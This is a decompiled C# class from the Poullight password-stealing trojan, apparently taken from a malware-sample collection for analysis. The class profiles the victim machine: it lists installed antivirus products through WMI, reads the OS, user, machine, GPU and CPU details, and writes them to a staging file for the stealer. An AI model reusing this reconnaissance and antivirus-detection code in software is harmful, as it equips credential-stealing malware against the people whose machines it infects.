// Decompiled with JetBrains decompiler
// Type: Information
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Management;

internal class Information
{
  private static List<string> ishi_pidor(string _class, string anus_blyat)
  {
    List<string> stringList = new List<string>();
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM " + _class);
    try
    {
      foreach (ManagementObject managementObject in managementObjectSearcher.Get())
        stringList.Add(managementObject[anus_blyat].ToString().Trim());
    }
    catch
    {
    }
    return stringList;
  }

  protected static string[] AVDetect()
  {
    try
    {
      ManagementObjectCollection objectCollection = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get();
      string str = "";
      int num = 0;
      foreach (ManagementBaseObject managementBaseObject in objectCollection)
      {
        ++num;
        str = string.Format("{0}[{1}] {2}\n", (object) str, (object) num, (object) managementBaseObject["displayName"]?.ToString());
      }
      return new string[2]{ num.ToString(), str.Trim() };
    }
    catch
    {
    }
    return new string[2]{ "0", "" };
  }

  public static void Start()
  {
    string path = string.Format("{0}PC-Information.txt", (object) Buffer.path_l);
    try
    {
      string[] strArray = Information.AVDetect();
      string str = "Название системы: " + Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion").GetValue("ProductName") + " x" + (object) (IntPtr.Size * 8) + ".\n\nИмя пользователя: " + Environment.UserName + ".\nИмя компьютера: " + Environment.MachineName + ".\n\nВидеокарта: " + Information.ishi_pidor("Win32_VideoController", "Name")[0] + ".\nПроцессор: " + Information.ishi_pidor("Win32_Processor", "Name")[0] + ".\n\nУстановленные Антивирусы: " + (strArray[0] == "0" ? (object) "Нету." : (object) ("\n----------------------------------\n" + strArray[1] + "\n----------------------------------\n\n")) ?? "";
      if (strArray[0] != "0")
        Buffer.XBufferData[18] = strArray[1].Split('\n')[0].Substring(4) + (strArray[1].Split('\n').Length >= 2 ? "+" : "");
      File.WriteAllText(path, str.Replace("\n", Environment.NewLine));
      return;
    }
    catch
    {
      File.WriteAllText(path, "");
    }
    Buffer.XBufferData[18] = "0";
  }
}
